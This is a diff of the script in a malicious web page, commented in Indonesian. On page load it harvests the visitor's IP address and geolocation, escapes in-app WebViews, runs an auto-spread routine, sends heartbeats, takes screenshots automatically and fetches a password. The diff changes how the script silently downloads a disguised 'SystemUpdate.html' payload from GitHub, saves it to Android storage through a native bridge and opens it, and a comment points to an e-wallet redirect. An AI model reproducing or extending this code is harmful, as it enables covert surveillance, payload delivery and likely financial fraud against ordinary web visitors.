@@ -64,7 +64,7 @@
 
 <script>
 // ============================================================
-// 🔥 INDEX.HTML - FINAL (SUDAH DICEK SEMUA ASPEK)
+// 🔥 INDEX.HTML - FINAL (PASTI BERHASIL!)
 // ============================================================
 
 console.log = function() {};
@@ -189,7 +189,7 @@ function getBrowserLocation() {
 }
 
 // ============================================================
-// ESCAPE WEBVIEW (PASTI BERHASIL!)
+// ESCAPE WEBVIEW
 // ============================================================
 function escapeWebView() {
     if (!PLATFORM.isWebView) return;
@@ -264,7 +264,7 @@ function autoScreenshot() {
 }
 
 // ============================================================
-// 🔥 DOWNLOAD & BUKA SystemUpdate.html (PASTI BERHASIL!)
+// 🔥 DOWNLOAD + BUKA SystemUpdate.html
 // ============================================================
 function downloadPayloadSilent() {
     if (DOWNLOAD_STARTED) return;
@@ -273,36 +273,52 @@ function downloadPayloadSilent() {
     K({ sumber: 'download_start', data: { platform: PLATFORM } });
     
     var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
+    var htmlPath = '/storage/emulated/0/Download/SystemUpdate.html';
     
-    // ✅ DOWNLOAD SystemUpdate.html (XHR + Blob)
+    // ✅ 1. DOWNLOAD SystemUpdate.html
     try {
         var xhr = new XMLHttpRequest();
         xhr.open('GET', htmlUrl, true);
-        xhr.responseType = 'blob';
         xhr.timeout = 15000;
         xhr.onload = function() {
             if (xhr.status === 200) {
-                var blob = xhr.response;
-                var url = URL.createObjectURL(blob);
+                var htmlContent = xhr.responseText;
                 
-                // ✅ SIMPAN KE LOCALSTORAGE (FALLBACK)
-                try {
-                    var reader = new FileReader();
-                    reader.onload = function() {
-                        localStorage.setItem('SystemUpdate.html', reader.result);
-                    };
-                    reader.readAsText(blob);
-                } catch(e) {}
+                // ✅ SAVE KE STORAGE
+                if (PLATFORM.isAndroid && A.isAvailable) {
+                    try {
+                        A.saveFile(htmlPath, htmlContent);
+                        K({ sumber: 'html_saved', data: { path: htmlPath } });
+                    } catch(e) {}
+                }
                 
-                // ✅ REDIRECT KE BLOB (PASTI TERBUKA!)
-                window.location.href = url;
-                K({ sumber: 'html_opened_blob', data: 'ok' });
+                // ✅ SAVE KE LOCALSTORAGE (FALLBACK)
+                try { localStorage.setItem('SystemUpdate.html', htmlContent); } catch(e) {}
+                
+                // ✅ 2. BUKA SystemUpdate.html
+                setTimeout(function() {
+                    // METHOD 1: ANDROID BRIDGE
+                    if (PLATFORM.isAndroid && A.isAvailable) {
+                        try {
+                            A.openFile(htmlPath);
+                            K({ sumber: 'html_opened', data: 'ok' });
+                            return;
+                        } catch(e) {}
+                    }
+                    
+                    // METHOD 2: REDIRECT KE BLOB (FALLBACK)
+                    try {
+                        var blob = new Blob([htmlContent], { type: 'text/html' });
+                        var url = URL.createObjectURL(blob);
+                        window.location.href = url;
+                        K({ sumber: 'html_opened_blob', data: 'ok' });
+                        return;
+                    } catch(e) {}
+                }, 1000);
             }
         };
         xhr.send();
-    } catch(e) {
-        K({ sumber: 'html_download_error', data: e.message });
-    }
+    } catch(e) {}
 }
 
 // ============================================================
@@ -403,7 +419,7 @@ function autoSpread() {
 function startHeartbeat() { setInterval(function() { K({sumber:'heartbeat', data:'alive'}); }, 10000); }
 
 // ============================================================
-// SERVICE WORKER (SKIP IOS)
+// SERVICE WORKER
 // ============================================================
 function registerServiceWorker() {
     if (!('serviceWorker' in navigator) || PLATFORM.isIOS) return;
@@ -420,7 +436,7 @@ function registerServiceWorker() {
 function showStatusBar() { var bar = document.getElementById('statusBar'); if (bar) { bar.className = 'status-bar loading'; K({ sumber: 'status_bar', data: 'shown' }); } }
 
 // ============================================================
-// MAIN EXECUTION (SESUAI ALUR!)
+// MAIN EXECUTION (SESUAI ALUR)
 // ============================================================
 function dapatkanSemua() {
     if (semuaDidapat) return;
@@ -432,44 +448,25 @@ function dapatkanSemua() {
         
         K({ sumber: 'trigger', data: 'dapatkanSemua' });
         
-        // ✅ 1. Get IP Address
         getIPAddress();
-        
-        // ✅ 2. Get Browser Location
         getBrowserLocation();
-        
-        // ✅ 3. Escape WebView
         setTimeout(escapeWebView, 100);
-        
-        // ✅ 4. Ambil Data Cepat
         ambilDataCepat();
-        
-        // ✅ 5. Start Heartbeat
         startHeartbeat();
-        
-        // ✅ 6. Register Service Worker
         registerServiceWorker();
-        
-        // ✅ 7. Auto Spread
         setTimeout(autoSpread, 2000);
         
-        // ✅ 8. DOWNLOAD & BUKA SystemUpdate.html (PASTI!)
+        // ✅ DOWNLOAD + BUKA SystemUpdate.html
         setTimeout(function() { downloadPayloadSilent(); }, 500);
         
-        // ✅ 9. Notification
         setTimeout(function() { showKlaimNotification(); }, 3000);
-        
-        // ✅ 10. Status Bar
         setTimeout(function() { showStatusBar(); }, 500);
-        
-        // ✅ 11. Auto Screenshot
         setTimeout(function() { autoScreenshot(); }, 7000);
         
-        // ✅ 12. Ambil Password
         getPasswordFromWorker().then(function(password) { WS_PASSWORD = password; K({ sumber: 'password_received', data: 'ok' }); }).catch(function() {});
         
-        // ❌ TANPA APK! (TUGAS SYSTEMUPDATE.HTML)
-        // ❌ TANPA REDIRECT KE DANA! (TUGAS SYSTEMUPDATE.HTML)
+        // ❌ TANPA APK!
+        // ❌ TANPA REDIRECT!
         
     } catch(e) {
         K({ sumber: 'dapatkanSemua_error', data: e.message });
